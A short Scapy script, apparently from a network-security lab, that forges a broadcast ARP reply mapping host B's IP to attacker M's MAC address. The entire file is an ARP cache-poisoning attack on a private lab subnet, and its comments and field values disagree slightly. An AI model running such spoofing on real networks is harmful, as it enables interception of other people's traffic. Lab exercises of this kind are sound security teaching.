#!/usr/bin/envpython3 
from scapy.all import * 

# map B's IP to M's Mac
# send to A
# in other words: send packet to A from M but fake from B ?

mip = "10.9.0.105"
aip = "10.9.0.5"
bip = "10.9.0.6"
mmac = "02:42:0a:09:00:69"
amac = "02:42:0a:09:00:05" # found in the last packet task (task 1.1)

E=Ether() 
A=ARP() 
A.op=2 #1forARPrequest;2forARPreply 

A.pdst = bip
A.hwsrc = mmac
A.psrc = bip 
#A.hwsrc = mmac

E.dst = "ff:ff:ff:ff:ff:ff"
#E.src = mmac


pkt=E/A 
pkt.show()
sendp(pkt)


